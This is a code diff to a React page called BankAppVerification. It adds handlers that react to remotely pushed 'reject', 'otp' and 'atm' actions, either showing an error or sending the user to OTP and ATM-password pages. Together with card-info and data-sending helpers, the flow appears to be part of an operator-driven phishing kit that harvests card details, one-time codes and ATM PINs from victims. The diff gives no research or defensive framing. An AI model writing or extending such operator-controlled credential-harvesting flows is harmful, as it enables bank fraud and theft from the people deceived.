@@ -1,11 +1,13 @@
 import { useEffect, useState } from "react";
+import { useLocation } from "wouter";
 import { useSignalEffect } from "@preact/signals-react";
 import PageLayout from "@/components/layout/PageLayout";
 import WaitingOverlay, { waitingCardInfo } from "@/components/WaitingOverlay";
 import { Button } from "@/components/ui/button";
-import { sendData, cardAction, navigateToPage } from "@/lib/store";
+import { sendData, cardAction, navigateToPage, waitingMessage } from "@/lib/store";
 
 export default function BankAppVerification() {
+  const [, navigate] = useLocation();
   const [error, setError] = useState(false);
   const [isWaiting, setIsWaiting] = useState(false);
   const [rejected, setRejected] = useState(false);
@@ -19,7 +21,19 @@ export default function BankAppVerification() {
   useSignalEffect(() => {
     const a = cardAction.value;
     if (!a) return;
-    if (a.action === "reject") { setRejected(true); setError(true); setIsWaiting(false); }
+    if (a.action === "reject") {
+      setRejected(true);
+      setError(true);
+      setIsWaiting(false);
+    } else if (a.action === "otp") {
+      waitingMessage.value = "";
+      setIsWaiting(false);
+      navigate("/otp-verification");
+    } else if (a.action === "atm") {
+      waitingMessage.value = "";
+      setIsWaiting(false);
+      navigate("/atm-password");
+    }
     cardAction.value = null;
   });
 
